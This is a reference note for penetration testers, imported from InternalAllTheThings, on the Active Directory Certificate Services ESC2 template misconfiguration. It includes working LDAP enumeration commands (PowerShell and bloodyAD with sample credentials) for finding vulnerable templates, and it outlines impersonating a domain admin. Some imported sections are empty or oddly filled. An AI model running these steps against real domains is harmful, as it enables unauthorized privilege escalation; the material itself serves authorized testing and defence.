---
title: Active Directory - Certificate ESC2
type: technique
tags: [active-directory, adcs, certificates, esc2, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC2

## What it is

**Requirements**.

## How it works

ESC2 exploits certificate templates that allow the requester to specify a Subject Alternative Name (SAN) combined with the `Any Purpose` EKU, which makes the certificate valid for any use including client authentication. Because the template imposes no restriction on the certificate's purpose, an attacker can request a certificate with an arbitrary SAN and use it to authenticate as any domain principal. The attack follows the same enrollment abuse path as ESC1 but relies on the overly permissive EKU rather than the `ENROLLEE_SUPPLIES_SUBJECT` flag.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC2 - Misconfigured Certificate Templates

**Requirements**

* Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)

**Exploitation**

* Find template

```ps1
PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
# or
python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'
```

* Request a certificate specifying the `/altname` as a domain admin like in [ESC1 - Misconfigured Certificate Templates](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc01/).

## References

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
